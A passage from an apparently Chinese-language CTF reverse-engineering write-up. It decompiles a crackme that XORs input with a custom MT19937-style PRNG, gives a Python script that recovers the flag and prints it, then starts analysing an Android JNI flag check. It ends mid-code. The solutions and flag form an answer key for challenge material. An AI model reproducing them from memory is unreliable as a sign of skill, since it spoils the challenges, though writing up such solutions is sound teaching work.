class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [xsp+1Ch] [xbp+1Ch]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to house of jjkk&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%128s&quot;</span>, input);<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(input) == len )<br>  &#123;<br>    srand(<span class="hljs-number">114514</span>);<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">127</span>; ++i )<br>      input[i] ^= rand();<br>    <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">memcmp</span>(input, &amp;cipher, len) )<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Right! &quot;</span>);<br>    <span class="hljs-keyword">else</span><br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wrong! &quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Lenth wrong! &quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中 srand 和 rand 组成了一个类似 MT19937 的伪随机数生成器</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">__int16 *__fastcall <span class="hljs-title function_">srand</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span><br>&#123;<br>  __int16 *result; <span class="hljs-comment">// x0</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [xsp+1Ch] [xbp-4h]</span><br><br>  mt[<span class="hljs-number">0</span>] = a1;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">0x71</span>; ++i )<br>    mt[i] = (<span class="hljs-number">0xA7A25365</span> * (mt[i - <span class="hljs-number">1</span>] ^ ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)mt[i - <span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">30</span>)) + i) ^ <span class="hljs-number">0x56</span>;<br>  result = &amp;index1;<br>  index1 = <span class="hljs-number">114</span>;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">rand</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [xsp+Ch] [xbp-14h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [xsp+10h] [xbp-10h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [xsp+14h] [xbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [xsp+1Ch] [xbp-4h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [xsp+1Ch] [xbp-4h]</span><br><br>  v1 = (<span class="hljs-type">unsigned</span> __int16)index1;<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int16)index1 &gt; <span class="hljs-number">0x71u</span> )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">0x71</span>; ++i )<br>    &#123;<br>      v3 = (mt[i] &amp; <span class="hljs-number">0x80000</span> | mt[(i + <span class="hljs-number">1</span>) % <span class="hljs-number">0x72</span>] &amp; <span class="hljs-number">0x7FFFFu</span>) &gt;&gt; <span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">if</span> ( (mt[(i + <span class="hljs-number">1</span>) % <span class="hljs-number">0x72</span>] &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> )<br>        v3 ^= <span class="hljs-number">0x8908B0DF</span>;<br>      mt[i] = mt[(i + <span class="hljs-number">514</span>) % <span class="hljs-number">0x72</span>] ^ v3;<br>    &#125;<br>    index1 = <span class="hljs-number">0</span>;<br>    v1 = <span class="hljs-number">0</span>;<br>  &#125;<br>  v4 = mt[v1];<br>  index1 = v1 + <span class="hljs-number">1</span>;<br>  v5 = v4 ^ (v4 &gt;&gt; <span class="hljs-number">11</span>) ^ ((v4 ^ (v4 &gt;&gt; <span class="hljs-number">11</span>)) &lt;&lt; <span class="hljs-number">7</span>) &amp; <span class="hljs-number">0x9D2C5680</span>;<br>  <span class="hljs-keyword">return</span> v5 ^ (v5 &lt;&lt; <span class="hljs-number">15</span>) &amp; <span class="hljs-number">0xEFC60000</span> ^ ((v5 ^ (v5 &lt;&lt; <span class="hljs-number">15</span>) &amp; <span class="hljs-number">0xEFC60000</span>) &gt;&gt; <span class="hljs-number">18</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>&amp; cipher 处提取出密文(128 字节)</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0xCD</span>, <span class="hljs-number">0</span>xC7, <span class="hljs-number">0</span>xE2, <span class="hljs-number">0</span>x86, <span class="hljs-number">0</span>x3A, <span class="hljs-number">0</span>x19, <span class="hljs-number">0</span>xB9, <span class="hljs-number">0</span>xB6, <span class="hljs-number">0</span>xF1, <span class="hljs-number">0</span>x81,<br><span class="hljs-attribute">0x45</span>, <span class="hljs-number">0</span>xB4, <span class="hljs-number">0</span>xB6, <span class="hljs-number">0</span>xE5, <span class="hljs-number">0</span>x0D, <span class="hljs-number">0</span>xD4, <span class="hljs-number">0</span>xB4, <span class="hljs-number">0</span>xA6, <span class="hljs-number">0</span>xD3, <span class="hljs-number">0</span>xF7,<br><span class="hljs-attribute">0x33</span>, <span class="hljs-number">0</span>x5D, <span class="hljs-number">0</span>x5F, <span class="hljs-number">0</span>x09, <span class="hljs-number">0</span>x95, <span class="hljs-number">0</span>xAF, <span class="hljs-number">0</span>x9A, <span class="hljs-number">0</span>xBE, <span class="hljs-number">0</span>x89, <span class="hljs-number">0</span>xEA,<br><span class="hljs-attribute">0x54</span>, <span class="hljs-number">0</span>x71, <span class="hljs-number">0</span>x68, <span class="hljs-number">0</span>xC6, <span class="hljs-number">0</span>x8B, <span class="hljs-number">0</span>x84, <span class="hljs-number">0</span>x05, <span class="hljs-number">0</span>x14, <span class="hljs-number">0</span>xBB, <span class="hljs-number">0</span>x41,<br><span class="hljs-attribute">0xDD</span>, <span class="hljs-number">0</span>x34, <span class="hljs-number">0</span>x91, <span class="hljs-number">0</span>x1B, <span class="hljs-number">0</span>x21, <span class="hljs-number">0</span>x83, <span class="hljs-number">0</span>xDE, <span class="hljs-number">0</span>x15, <span class="hljs-number">0</span>x52, <span class="hljs-number">0</span>x22,<br><span class="hljs-attribute">0x8A</span>, <span class="hljs-number">0</span>xE1, <span class="hljs-number">0</span>xBD, <span class="hljs-number">0</span>x33, <span class="hljs-number">0</span>x4D, <span class="hljs-number">0</span>x7E, <span class="hljs-number">0</span>xD2, <span class="hljs-number">0</span>xA3, <span class="hljs-number">0</span>xA9, <span class="hljs-number">0</span>x12,<br><span class="hljs-attribute">0xF1</span>, <span class="hljs-number">0</span>xE9, <span class="hljs-number">0</span>x88, <span class="hljs-number">0</span>x60, <span class="hljs-number">0</span>x24, <span class="hljs-number">0</span>xE6, <span class="hljs-number">0</span>xAB, <span class="hljs-number">0</span>x54, <span class="hljs-number">0</span>xCF, <span class="hljs-number">0</span>x02,<br><span class="hljs-attribute">0x1B</span>, <span class="hljs-number">0</span>x6B, <span class="hljs-number">0</span>x6B, <span class="hljs-number">0</span>xBA, <span class="hljs-number">0</span>x26, <span class="hljs-number">0</span>x09, <span class="hljs-number">0</span>xFB, <span class="hljs-number">0</span>x10, <span class="hljs-number">0</span>x97, <span class="hljs-number">0</span>xDF,<br><span class="hljs-attribute">0x17</span>, <span class="hljs-number">0</span>xBF, <span class="hljs-number">0</span>xCC, <span class="hljs-number">0</span>xE7, <span class="hljs-number">0</span>xB0, <span class="hljs-number">0</span>x42, <span class="hljs-number">0</span>xE5, <span class="hljs-number">0</span>x32, <span class="hljs-number">0</span>x4C, <span class="hljs-number">0</span>x0F,<br><span class="hljs-attribute">0xE0</span>, <span class="hljs-number">0</span>x60, <span class="hljs-number">0</span>x47, <span class="hljs-number">0</span>xD0, <span class="hljs-number">0</span>x5A, <span class="hljs-number">0</span>xE8, <span class="hljs-number">0</span>x48, <span class="hljs-number">0</span>xAE, <span class="hljs-number">0</span>x74, <span class="hljs-number">0</span>x4D,<br><span class="hljs-attribute">0x98</span>, <span class="hljs-number">0</span>x7A, <span class="hljs-number">0</span>xB3, <span class="hljs-number">0</span>xD2, <span class="hljs-number">0</span>xDE, <span class="hljs-number">0</span>x1B, <span class="hljs-number">0</span>x96, <span class="hljs-number">0</span>x91, <span class="hljs-number">0</span>x7A, <span class="hljs-number">0</span>x03,<br><span class="hljs-attribute">0x67</span>, <span class="hljs-number">0</span>xCF, <span class="hljs-number">0</span>xF0, <span class="hljs-number">0</span>x31, <span class="hljs-number">0</span>x32, <span class="hljs-number">0</span>x49, <span class="hljs-number">0</span>x9A, <span class="hljs-number">0</span>xE0, <span class="hljs-number">0</span>xC2, <span class="hljs-number">0</span>x3B,<br><span class="hljs-attribute">0x51</span>, <span class="hljs-number">0</span>x63, <span class="hljs-number">0</span>xFF, <span class="hljs-number">0</span>x84, <span class="hljs-number">0</span>x60, <span class="hljs-number">0</span>x5B, <span class="hljs-number">0</span>xC1, <span class="hljs-number">0</span>x8E<br></code></pre></td></tr></table></figure><h4 id="解密-3"><a href="#解密-3" class="headerlink" title="解密"></a>解密</h4><p>伪随机算法已经反编译得很清楚了，稍作修改就可以了，要注意加密 <code>input[i] ^= rand()</code>是对单字节操作,所以获得 rand() 值时要取低八位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python">cipher = [<br>    <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x81</span>,<br>    <span class="hljs-number">0x45</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0xF7</span>,<br>    <span class="hljs-number">0x33</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xEA</span>,<br>    <span class="hljs-number">0x54</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x22</span>,<br>    <span class="hljs-number">0x8A</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x12</span>,<br>    <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0x02</span>,<br>    <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xDF</span>,<br>    <span class="hljs-number">0x17</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x0F</span>,<br>    <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x4D</span>,<br>    <span class="hljs-number">0x98</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x03</span>,<br>    <span class="hljs-number">0x67</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x3B</span>,<br>    <span class="hljs-number">0x51</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x8E</span><br>]<br><br>mt = [<span class="hljs-number">0</span>] * <span class="hljs-number">0x72</span> <span class="hljs-comment"># 114 </span><br><span class="hljs-comment"># 状态数组</span><br>index1 = <span class="hljs-number">114</span><br><span class="hljs-comment"># 当前随机数生成的位置索引</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">srand</span>(<span class="hljs-params">a</span>): <span class="hljs-comment"># 初始化伪随机数生成器</span><br>    <span class="hljs-keyword">global</span> mt, index1<br>    mt[<span class="hljs-number">0</span>] = a<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">0x72</span>):<br>        mt[i] = (<span class="hljs-number">0xA7A25365</span> * (mt[i - <span class="hljs-number">1</span>] ^ (mt[i - <span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">30</span>)) + i) ^ <span class="hljs-number">0x56</span><br>        mt[i] &amp;= <span class="hljs-number">0xFFFFFFFF</span><br>    index1 = <span class="hljs-number">114</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rand</span>(): <span class="hljs-comment"># 生成伪随机数</span><br>    <span class="hljs-keyword">global</span> mt,index1<br>    v1 = index1<br>    <span class="hljs-keyword">if</span> index1 &gt; <span class="hljs-number">0x71</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x72</span>):<br>            v3 = (mt[i] &amp; <span class="hljs-number">0x80000</span> | mt[(i + <span class="hljs-number">1</span>) % <span class="hljs-number">0x72</span>] &amp; <span class="hljs-number">0x7FFFF</span>) &gt;&gt; <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> mt[(i + <span class="hljs-number">1</span>) % <span class="hljs-number">0x72</span>] &amp; <span class="hljs-number">1</span>:<br>                v3 ^= <span class="hljs-number">0x8908B0DF</span><br>            mt[i] = mt[(i + <span class="hljs-number">514</span>) % <span class="hljs-number">0x72</span>] ^ v3<br>        index1 = <span class="hljs-number">0</span><br>        v1 = <span class="hljs-number">0</span><br>    v4 = mt[v1]<br>    index1 = v1 + <span class="hljs-number">1</span><br>    v5 = v4 ^ (v4 &gt;&gt; <span class="hljs-number">11</span>) ^ ((v4 ^ (v4 &gt;&gt; <span class="hljs-number">11</span>)) &lt;&lt; <span class="hljs-number">7</span>) &amp; <span class="hljs-number">0x9D2C5680</span><br>    v5 = v5 ^ (v5 &lt;&lt; <span class="hljs-number">15</span>) &amp; <span class="hljs-number">0xEFC60000</span> ^ ((v5 ^ ((v5 &lt;&lt; <span class="hljs-number">15</span>) &amp; <span class="hljs-number">0xEFC60000</span>)) &gt;&gt; <span class="hljs-number">18</span>)<br>    <span class="hljs-keyword">return</span> v5 &amp; <span class="hljs-number">0xFFFFFFFF</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dec</span>(<span class="hljs-params">cipher</span>):<br>    srand(<span class="hljs-number">114514</span>)<br>    flag_bytes = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cipher:<br>        r = rand() &amp; <span class="hljs-number">0xFF</span> <span class="hljs-comment"># 取低八位</span><br>        flag_bytes.append(i ^ r)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(flag_bytes)<br><br>flag = dec(cipher)<br><span class="hljs-built_in">print</span>(flag.decode())<br></code></pre></td></tr></table></figure><p>flag 为 <code>flag&#123;R4ndom_rand0m_happy_Funnny_R4ndom_1s_r3ally_funNy!!_hhh233HHH_this_1s_just_a_pi3ce_of_sh1t_fffkkkkkk_f4ck_jjjjKKKKKjjjjasd&#125;</code></p><h3 id="simple"><a href="#simple" class="headerlink" title="simple"></a>simple</h3><h4 id="java-层"><a href="#java-层" class="headerlink" title="java 层"></a>java 层</h4><p>主要逻辑在 com.example.simpleandroid.CheckActivity</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs js">public <span class="hljs-keyword">class</span> <span class="hljs-title class_">CheckActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">AppCompatActivity</span> &#123;<br>    private <span class="hljs-title class_">ActivityCheckBinding</span> binding;<br><br>    public native boolean <span class="hljs-title class_">CheckData</span>(<span class="hljs-title class_">String</span> str);<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-title class_">System</span>.<span class="hljs-title function_">loadLibrary</span>(<span class="hljs-string">&quot;check&quot;</span>);<br>    &#125;<br><br>    public <span class="hljs-keyword">static</span> synchronized <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title function_">synchronized</span> (<span class="hljs-title class_">CheckActivity</span>.<span class="hljs-property">class</span>) &#123;<br>            <span class="hljs-title class_">ShadowHook</span>.<span class="hljs-title function_">init</span>();<br>        &#125;<br>    &#125;<br><br>    @<span class="hljs-title class_">Override</span> <span class="hljs-comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span><br>    protected <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span>(<span class="hljs-params">Bundle savedInstanceState</span>) &#123;<br>        <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">onCreate</span>(savedInstanceState);<br>        <span class="hljs-title function_">init</span>();<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">binding</span> = <span class="hljs-title class_">ActivityCheckBinding</span>.<span class="hljs-title function_">inflate</span>(<span class="hljs-title function_">getLayoutInflater</span>());<br>        <span class="hljs-title function_">setContentView</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">binding</span>.<span class="hljs-title function_">getRoot</span>());<br>        <span class="hljs-title class_">Button</span> button = <span class="hljs-variable language_">this</span>.<span class="hljs-property">binding</span>.<span class="hljs-property">check2</span>;<br>        button.<span class="hljs-title function_">setOnClickListener</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">View</span>.<span class="hljs-title class_">OnClickListener</span>() &#123; <span class="hljs-comment">// from class: com.example.simpleandroid.CheckActivity.1</span><br>            @<span class="hljs-title class_">Override</span> <span class="hljs-comment">// android.view.View.OnClickListener</span><br>            public <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span>(<span class="hljs-params">View v</span>) &#123;<br>                <span class="hljs-title class_">EditText</span> editText = <span class="hljs-title class_">CheckActivity</span>.<span class="hljs-property">this</span>.<span class="hljs-property">binding</span>.<span class="hljs-property">inputFlag2</span>;<br>                editText.<span class="hljs-title function_">setFilters</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputFilter</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputFilter</span>.<span class="hljs-title class_">LengthFilter</span>(<span class="hljs-number">30</span>)&#125;);<br>                <span class="hljs-title class_">String</span> input = editText.<span class="hljs-title function_">getText</span>().<span class="hljs-title function_">toString</span>();<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title class_">CheckActivity</span>.<span class="hljs-property">this</span>.<span class="hljs-title function_">isValidInput</span>(input) &amp;&amp; <span class="hljs-title class_">CheckActivity</span>.<span class="hljs-property">this</span>.<span class="hljs-title class_">CheckData</span>(input)) &#123;<br>                    <span class="hljs-title class_">Toast</span>.<span class="hljs-title function_">makeText</span>(<span class="hljs-title class_">CheckActivity</span>.<span class="hljs-property">this</span>, <span class="hljs-string">&quot;You are right&quot;</span>, <span class="hljs-number">0</span>).<span class="hljs-title function_">show</span>();<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-title class_">Toast</span>.<span class="hljs-title function_">makeText</span>(<span class="hljs-title class_">CheckActivity</span>.<span class="hljs-property">this</span>, <span class="hljs-string">&quot;You are wrong&quot;</span>, <span class="hljs-number">0</span>).<span class="hljs-title function_">show</span>();<br>                &#125;<br>            &#125;<br>        &#125;);<br>    &#125;<br><br>    <span class="hljs-comment">/* JADX INFO: Access modifiers changed from: private */</span><br>    public boolean <span class="hljs-title function_">isValidInput</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> input</span>) &#123;<br>        <span class="hljs-keyword">return</span> input.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">&quot;flag&#123;&quot;</span>) &amp;&amp; input.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">&quot;&#125;&quot;</span>) &amp;&amp; input.<span class="hljs-title function_">length</span>() == <span class="hljs-number">32</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>声明了一个 native 方法 CheckData，在本地库 libcheck.so 里<br>读取字符串输入之后，先调用 isValidInput(input) 做格式检查，再调用 native 方法 CheckData(input) 做进一步校验</p><h4 id="native-层"><a href="#native-层" class="headerlink" title="native 层"></a>native 层</h4><p>先找到 CheckData</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">Java_com_example_simpleandroid_CheckActivity_CheckData</span><span class="hljs-params">(__int64 a1, __int64 a2, __int64 a3)</span><br>&#123;<br>  _BYTE *v3; <span class="hljs-comment">// x9</span><br>  <span class="hljs-type">char</span> v4; <span class="hljs-comment">// w8</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [xsp+4h] [xbp-2Ch]</span><br>  __int64 StringUTFChars; <span class="hljs-comment">// [xsp+8h] [xbp-28h]</span><br><br>  StringUTFChars = _JNIEnv::GetStringUTFChars();<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; ++i )<br>  &#123;<br>    v3 = (_BYTE *)(StringUTFChars + i);<br>    v4 = *v3 ^ (ee[i] != <span class="hljs-number">0x7F</span>);<br>    *v3 = v4;<br>    <span class="hljs-keyword">if</span> ( v4 )<br>    &#123;<br>      ((<span class="hljs-type">void</span> (__fastcall *)(__int64, __int64, __int64))_JNIEnv::ReleaseStringUTFChars)(a1, a3, StringUTFChars);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>  &#125;<br>  ((<span class="hljs-type">void</span> (__fastcall *)(__int64, __int64, 